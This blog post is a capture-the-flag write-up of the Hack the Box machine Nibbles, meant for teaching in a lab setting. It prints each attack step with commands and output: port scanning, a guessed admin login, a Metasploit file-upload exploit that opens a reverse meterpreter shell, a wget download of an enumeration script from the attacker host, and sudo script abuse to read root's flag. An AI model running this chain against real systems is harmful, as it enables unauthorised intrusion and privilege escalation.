---
layout: single
title: "Hack the Box: Nibbles Writeup"
header:
  teaser: oth.png
  overlay_image: nibbles/nibblescover.jpg
  caption: "[__Hack the Box__](https://www.hackthebox.eu/)"
related: true
comments: true
---

Today lets see the Hack the Box Machine __Nibbles__ 


<a href="/images/nibbles/nibbles.png"><img src="/images/nibbles/nibbles.png"></a>


So let's start with a TCP SYN scan for service discovery using Nmap to identify open ports and network services on the target machine.

```console
root@kali:~# nmap -sS -Pn -sV -T4 10.10.10.75
Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-15 23:14 +08
Nmap scan report for 10.10.10.75
Host is up (0.37s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  ssl/http Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 
```
The port 80 and 22 are open in our target machine


The port 80 is open, so lets dirb the target machine to identify other interesting directories or pages.
we can also use go-buster to brute-force and identify other interesting directories or pages.

```console
root@kali:~# dirb http://10.10.10.75
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
START_TIME: Fri May 25 23:18:52 2018
URL_BASE: http://10.10.10.75/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
GENERATED WORDS: 4612                                                          
---- Scanning URL: http://10.10.10.75/ ----
+ http://10.10.10.75/index.html (CODE:200|SIZE:93)                                                        
+ http://10.10.10.75/server-status (CODE:403|SIZE:299)                                                                                                                                                          
```
there’s nothing much useful on the enumeration results.

Now let's try to manually Enumerate the website

<a href="/images/Nibbles website 1.png"><img src="/images/nibbles/Nibbles website 1.png"></a>

Checking the source code we could find a directory

<a href="/images/Nibbles website 2.png"><img src="/images/nibbles/Nibbles website 2.png"></a>

On checking the 10.10.10.75/nibbleblog we got the blog home page 

<a href="/images/Nibbles website 3.png"><img src="/images/nibbles/Nibbles website 3.png"></a>

Now lets again run dirb to find out any interesting directories

Here we got the /nibbleblog/admin.php page 
<a href="/images/Nibbles website 4.png"><img src="/images/nibbles/Nibbles website 4.png"></a>

Now lets try to login in manually and by guessing i got the __username__ as "__admin__" and __password__ as "__nibbles__"

<a href="/images/Nibbles website 5.png"><img src="/images/nibbles/Nibbles website 5.png"></a>

Using searchploit I could find an Arbitrary File Upload Vulnerability

```console
root@kali:~# searchsploit nibbleblog
------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                 |  Path
                                                                               | (/usr/share/exploitdb/)
------------------------------------------------------------------------------- ----------------------------------------
Nibbleblog - Arbitrary File Upload (Metasploit)                                | exploits/php/remote/38489.rb
Nibbleblog - Multiple SQL Injections                                           | exploits/php/webapps/35865.txt
------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

Now let's try to exploit this vulnerability using Metasploit

```console
msf > search nibbleblog

Matching Modules
================

   Name                                       Disclosure Date  Rank       Description
   ----                                       ---------------  ----       -----------
   exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Nibbleblog File Upload Vulnerability

```

Now let's load the exploit

```console
msf > use exploit/multi/http/nibbleblog_file_upload

msf exploit(multi/http/nibbleblog_file_upload) > show options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                       yes       The target address
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host

   Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3


msf exploit(multi/http/nibbleblog_file_upload) > set rhost 10.10.10.75
rhost => 10.10.10.75

msf exploit(multi/http/nibbleblog_file_upload) > set username admin
username => admin

msf exploit(multi/http/nibbleblog_file_upload) > set password nibbles
password => nibbles


msf exploit(multi/http/nibbleblog_file_upload) > set targeturi /nibbleblog
targeturi => /nibbleblog

msf exploit(multi/http/nibbleblog_file_upload) > show payloads

Compatible Payloads
===================

   Name                                Disclosure Date  Rank    Description
   ----                                ---------------  ----    -----------
   generic/custom                                       normal  Custom Payload
   generic/shell_bind_tcp                               normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                            normal  Generic Command Shell, Reverse TCP Inline
   php/bind_perl                                        normal  PHP Command Shell, Bind TCP (via Perl)
   php/bind_perl_ipv6                                   normal  PHP Command Shell, Bind TCP (via perl) IPv6
   php/bind_php                                         normal  PHP Command Shell, Bind TCP (via PHP)
   php/bind_php_ipv6                                    normal  PHP Command Shell, Bind TCP (via php) IPv6
   php/download_exec                                    normal  PHP Executable Download and Execute
   php/exec                                             normal  PHP Execute Command 
   php/meterpreter/bind_tcp                             normal  PHP Meterpreter, Bind TCP Stager
   php/meterpreter/bind_tcp_ipv6                        normal  PHP Meterpreter, Bind TCP Stager IPv6
   php/meterpreter/bind_tcp_ipv6_uuid                   normal  PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
   php/meterpreter/bind_tcp_uuid                        normal  PHP Meterpreter, Bind TCP Stager with UUID Support
   php/meterpreter/reverse_tcp                          normal  PHP Meterpreter, PHP Reverse TCP Stager
   php/meterpreter/reverse_tcp_uuid                     normal  PHP Meterpreter, PHP Reverse TCP Stager
   php/meterpreter_reverse_tcp                          normal  PHP Meterpreter, Reverse TCP Inline
   php/reverse_perl                                     normal  PHP Command, Double Reverse TCP Connection (via Perl)
   php/reverse_php                                      normal  PHP Command Shell, Reverse TCP (via PHP)

msf exploit(multi/http/nibbleblog_file_upload) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp

msf exploit(multi/http/nibbleblog_file_upload) > show options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      10.10.10.75      yes       The target address
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /nibbleblog      yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3


msf exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.15.47
lhost => 10.10.15.47

```
 
Now let's run the exploit

```console
msf exploit(multi/http/nibbleblog_file_upload) > exploit

[*] Started reverse TCP handler on 10.10.15.47:4444 
[*] Sending stage (37775 bytes) to 10.10.10.75
[*] Meterpreter session 1 opened (10.10.15.47:4444 -> 10.10.10.75:59252) at 2018-06-06 18:49:32 +0530
[+] Deleted image.php

meterpreter > 

```
So now we got the meterpreter session and we are the user

```console
meterpreter > cd nibbler
meterpreter > ls
Listing: /home/nibbler
======================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100600/rw-------  0      fil   2017-12-29 16:00:07 +0530  .bash_history
40755/rwxr-xr-x   4096   dir   2018-06-06 18:53:00 +0530  .git
40775/rwxrwxr-x   4096   dir   2017-12-11 08:34:04 +0530  .nano
100644/rw-r--r--  1363   fil   2018-06-06 18:51:34 +0530  README.md
100755/rwxr-xr-x  14392  fil   2018-06-06 18:47:25 +0530  dc
100644/rw-r--r--  4963   fil   2018-06-06 18:46:47 +0530  dc.c
40755/rwxr-xr-x   4096   dir   2018-06-06 18:51:38 +0530  doc
40755/rwxr-xr-x   4096   dir   2018-06-06 18:51:52 +0530  lib
40755/rwxr-xr-x   4096   dir   2018-06-06 18:48:29 +0530  personal
100400/r--------  1855   fil   2017-12-29 16:24:29 +0530  personal.zip
40755/rwxr-xr-x   4096   dir   2018-06-06 18:51:40 +0530  tools
100644/rw-r--r--  3404   fil   2018-06-06 18:51:39 +0530  upc.sh
100400/r--------  33     fil   2017-12-29 16:13:54 +0530  user.txt

meterpreter > cat user.txt

```
So we got the "__user.txt__"


Got a limited shell inside the meterpreter session
```console
meterpreter > shell
Process 122906 created.
Channel 0 created.
ls
README.md
dc
dc.c
doc
files_cache.2177
lib
personal
personal.zip
privileged_cache.2177
tools
upc.sh
user.txt
```
Let's try to spawn a __TTY shell__ here from the "[__Netsec list__](https://netsec.ws/?p=337)"

```console
python3 -c 'import pty;pty.spawn("/bin/bash")'
nibbler@Nibbles:/home/nibbler/personal/stuff$ 

```
Next, we try to get the __LinEnum.sh__ file into our machine for that first I will run a PHP server in my local machine folder

```console
root@kali:~/Desktop/PrivEscalation Enum# php -S 10.10.15.47:444
PHP 7.2.4-1 Development Server started at Wed Jun  6 18:59:11 2018
Listening on http://10.10.15.47:444
Document root is /root/Desktop/PrivEscalation Enum
Press Ctrl-C to quit.
[Wed Jun  6 19:00:04 2018] 10.10.10.75:35560 [200]: /LinEnum.sh

```
Let's try to transfer the file into our machine using wget

```console
nibbler@Nibbles:/home/nibbler/personal/stuff$ wget http://10.10.15.47:444/LinEnum.sh -O /tmp/Linenum.sh
<er/personal/stuff$ wget http://10.10.15.47:444/LinEnum.sh -O /tmp/Linenum.sh
--2018-06-06 10:14:59--  http://10.10.15.47:444/LinEnum.sh
Connecting to 10.10.15.47:444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 42150 (41K) [application/x-sh]
Saving to: '/tmp/Linenum.sh'

/tmp/Linenum.sh     100%[===================>]  41.16K  43.8KB/s    in 0.9s    

```
so we go the file inside our machine
```console
nibbler@Nibbles:/tmp$ chmod 777 Linenum.sh
nibbler@Nibbles:/tmp$ sh ./Linenum.sh
```
On running Linux enum we got the following

```console
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

so let's try to cd into that folder and see

```console
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
nibbler@Nibbles:/home/nibbler/personal/stuff$ monitor.sh

```
Now let's change the contents inside the monitor.sh and try to run it as the root

```console
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "cat /root/root.txt" > monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat /root/root.txt

nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -u root ./monitor.sh
sudo: unable to resolve host Nibbles: Connection timed out
b6d745c0dfb6457c55591efc898ef88c

```
And that's done and we have finally got the "__root.txt__"
